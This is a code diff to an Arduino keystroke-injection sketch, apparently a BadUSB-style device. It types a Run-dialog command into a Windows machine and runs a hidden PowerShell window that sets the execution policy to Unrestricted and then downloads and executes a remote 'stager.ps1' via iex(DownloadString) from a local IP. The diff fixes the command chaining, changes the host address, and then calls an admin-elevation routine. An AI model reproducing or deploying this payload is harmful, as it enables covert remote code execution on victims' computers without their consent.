@@ -27,7 +27,7 @@ void setup()
   Keyboard.press('r');
   Keyboard.releaseAll();
   delay(250);
-  Keyboard.print("powershell.exe -w 1 Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted && powershell.exe -windowstyle 1 -nop -c \"iex(New-Object Net.WebClient).DownloadString('http://192.168.1.101/stager.ps1')\"");
+  Keyboard.print("powershell.exe -w 1 Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted & powershell.exe -windowstyle 1 -nop -c \"iex(New-Object Net.WebClient).DownloadString('http://192.168.1.222/stager.ps1')\"");
   delay(250);
   runasAdmin();
   Keyboard.end();
